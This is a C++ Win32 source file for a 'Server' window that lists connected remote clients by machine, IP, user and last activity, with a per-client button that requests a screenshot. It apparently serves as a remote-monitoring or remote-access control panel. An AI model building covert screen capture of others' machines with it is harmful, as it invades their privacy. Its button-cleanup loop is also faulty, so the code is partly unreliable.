#include "server.h"

Server server;

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam);
void AddClientToListView(HWND hListView, const Client& client, HWND hwnd);
void UpdateListView(HWND hListView, HWND hwnd);
void DrawBackground(HDC hdc, RECT rect);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR, int nShowCmd) {
    InitCommonControls();

    WNDCLASS wc = { 0 };
    wc.lpfnWndProc = WindowProc;
    wc.hInstance = hInstance;
    wc.lpszClassName = L"Server";
    RegisterClass(&wc);

    HWND hwnd = CreateWindowExW(0, L"Server", L"Server", WS_OVERLAPPEDWINDOW,
        CW_USEDEFAULT, CW_USEDEFAULT, 1000, 600, NULL, NULL, hInstance, NULL);

    ShowWindow(hwnd, nShowCmd);
    UpdateWindow(hwnd);

    std::thread updateThread([&]() {
        while (true) {
            PostMessage(hwnd, WM_USER + 1, 0, 0);
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        });

    updateThread.detach();

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    return 0;
}

LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    static HWND hListView;
    switch (uMsg) {
    case WM_CREATE: {
        hListView = CreateWindowEx(0, WC_LISTVIEW, L"",
            WS_CHILD | WS_VISIBLE | LVS_REPORT,
            10, 10, 760, 500, hwnd, NULL, ((LPCREATESTRUCT)lParam)->hInstance, NULL);

        HFONT hFont = CreateFont(
            20,
            0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
            DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
            DEFAULT_QUALITY, DEFAULT_QUALITY, L"Arial");
        SendMessage(hListView, WM_SETFONT, (WPARAM)hFont, TRUE);

        LVCOLUMN col;
        col.mask = LVCF_WIDTH | LVCF_TEXT | LVCF_SUBITEM;
        col.cx = 120;

        col.pszText = const_cast<LPWSTR>(L"ID");
        ListView_InsertColumn(hListView, 0, &col);
        col.pszText = const_cast<LPWSTR>(L"Machine");
        ListView_InsertColumn(hListView, 1, &col);
        col.pszText = const_cast<LPWSTR>(L"IP Address");
        ListView_InsertColumn(hListView, 2, &col);
        col.pszText = const_cast<LPWSTR>(L"User");
        ListView_InsertColumn(hListView, 3, &col);
        col.pszText = const_cast<LPWSTR>(L"Last Active");
        ListView_InsertColumn(hListView, 4, &col);

        break;
    }
    case WM_ERASEBKGND: {
        HDC hdc = (HDC)wParam;
        RECT rect;
        GetClientRect(hwnd, &rect);
        HBRUSH hBrush = CreateSolidBrush(RGB(255, 255, 255));
        FillRect(hdc, &rect, hBrush);
        DeleteObject(hBrush);
        return 1;
    }
    case WM_COMMAND: {
        if (HIWORD(wParam) == BN_CLICKED) {
            int clientId = LOWORD(wParam) - 100;
            server.makeScreenshot(clientId);
        }
        break;
    }
    case WM_USER + 1: {
        UpdateListView(hListView, hwnd);
        break;
    }
    case WM_DESTROY:
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hwnd, uMsg, wParam, lParam);
    }
    return 0;
}

void AddClientToListView(HWND hListView, const Client& client, HWND hwnd) {
    LVITEM item;
    item.mask = LVIF_TEXT;
    item.iItem = ListView_GetItemCount(hListView);
    item.iSubItem = 0;

    std::wstring idW = std::to_wstring(item.iItem + 1);
    item.pszText = const_cast<LPWSTR>(idW.c_str());
    ListView_InsertItem(hListView, &item);

    item.iSubItem = 1;
    std::wstring machineW(client.machine.begin(), client.machine.end());
    item.pszText = const_cast<LPWSTR>(machineW.c_str());
    ListView_SetItem(hListView, &item);

    item.iSubItem = 2;
    std::wstring ipW(client.ip.begin(), client.ip.end());
    item.pszText = const_cast<LPWSTR>(ipW.c_str());
    ListView_SetItem(hListView, &item);

    item.iSubItem = 3;
    std::wstring userW(client.user.begin(), client.user.end());
    item.pszText = const_cast<LPWSTR>(userW.c_str());
    ListView_SetItem(hListView, &item);

    item.iSubItem = 4;
    std::wstring lastActiveW(client.lastTimeActivity.begin(), client.lastTimeActivity.end());
    item.pszText = const_cast<LPWSTR>(lastActiveW.c_str());
    ListView_SetItem(hListView, &item);

    CreateWindowW(L"BUTTON", L"Screenshot", WS_TABSTOP | WS_VISIBLE | WS_CHILD,
        780, 10 + ((item.iItem+1) * 25), 100, 25, hwnd, (HMENU)(100 + item.iItem), NULL, NULL);
}

void UpdateListView(HWND hListView, HWND hwnd) {
    ListView_DeleteAllItems(hListView);
    for (int i = 0; i < ListView_GetItemCount(hListView); ++i) {
        HWND hButton = GetDlgItem(hwnd, 100 + i);
        if (hButton) {
            DestroyWindow(hButton);
        }
    }
    auto clients = server.getClients();
    for (const auto& client : clients) {
        AddClientToListView(hListView, *client, hwnd);
    }

    InvalidateRect(hListView, NULL, TRUE);
    UpdateWindow(hListView);
}
